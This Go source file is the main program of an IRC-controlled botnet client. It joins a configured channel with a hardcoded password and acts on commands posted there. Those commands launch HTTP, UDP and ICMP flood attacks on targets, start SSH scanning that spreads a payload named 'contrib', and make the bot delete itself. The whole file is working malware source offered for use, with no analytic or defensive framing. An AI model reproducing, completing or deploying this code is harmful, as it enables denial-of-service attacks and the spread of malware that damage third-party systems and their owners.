package main

import (
	"bufio"
	"fmt"
	"net/textproto"
	"os"

	"bot/tools"
)

//////////////////////////////////////////////////////////////////////////
//////////////////////// START CONFIG HERE!!! ///////////////////////////
////////////////////////////////////////////////////////////////////////

const (
	IRC_Server        = "192.168.1.4:6667" //config IRC server and port here.
	IRC_Backup_Server = "192.168.1.4:6667" //config Backup IRC server and port here.
	IRC_Channel       = "#Test "           //config channel here //should have space!!!
	IRC_Chan_Password = "3#D}X]kuxT$ "     //config channel password here.
	Payload_Name      = "contrib"          //config payload name //default is "contrib"
)

/////////////////////////////////////////////////////////////////
//////////////////////// END HERE!!! ///////////////////////////
///////////////////////////////////////////////////////////////

func main() {
	irc := tools.IRC_Conn(IRC_Server)
	tp := textproto.NewReader(bufio.NewReader(irc))
	tools.IRC_Login(irc, IRC_Channel, IRC_Chan_Password)

	for {
		ircRead, _ := tp.ReadLine()
		fmt.Println(ircRead)

		go func() {
			if tools.IRC_Find(ircRead, "PING :") {
				tools.IRC_Send(irc, "PONG "+tools.IRC_Recv(ircRead, 1))
			}
		}()

		//Join IRC channel
		if tools.IRC_Find(ircRead, "+iwx") || tools.IRC_Find(ircRead, "+i") ||
			tools.IRC_Find(ircRead, "+w") || tools.IRC_Find(ircRead, "+x") {
			tools.IRC_Send(irc, fmt.Sprint("JOIN "+IRC_Channel+IRC_Chan_Password))
		}

		go func() {
			if tools.IRC_Find(ircRead, "?http") {
				tools.DDoS_Switch = false
				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START HTTP GET FLOOD TO: "+
					tools.IRC_Recv(ircRead, 4))
				tools.HTTP(tools.IRC_Recv(ircRead, 4), IRC_Channel, irc)
			} else if tools.IRC_Find(ircRead, "?udp") {
				tools.DDoS_Switch = false
				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START UDP FLOOD TO: "+
					tools.IRC_Recv(ircRead, 4))
				tools.UDP(tools.IRC_Recv(ircRead, 4), tools.IRC_Recv(ircRead, 5), IRC_Channel, irc)
			} else if tools.IRC_Find(ircRead, "?icmp") {
				tools.DDoS_Switch = false
				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START ICMP FLOOD TO: "+
					tools.IRC_Recv(ircRead, 4))
				tools.ICMP(tools.IRC_Recv(ircRead, 4), IRC_Channel, irc)
			} else if tools.IRC_Find(ircRead, "?scan") {
				tools.Scan_Switch = false
				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START SCANNING.")
				tools.SSH_Conn(irc, tools.IRC_Recv(ircRead, 4), IRC_Channel, Payload_Name)
			} else if tools.IRC_Find(ircRead, "?kill") {
				os.Remove(os.Args[0])
				os.Exit(0)
			} else if tools.IRC_Find(ircRead, "?stop.ddos") {
				tools.DDoS_Switch = true
				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :STOP ATTACKING.")
			} else if tools.IRC_Find(ircRead, "?stop.scan") {
				tools.Scan_Switch = true
				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :STOP SCANNING.")
			}
		}()
	}
}
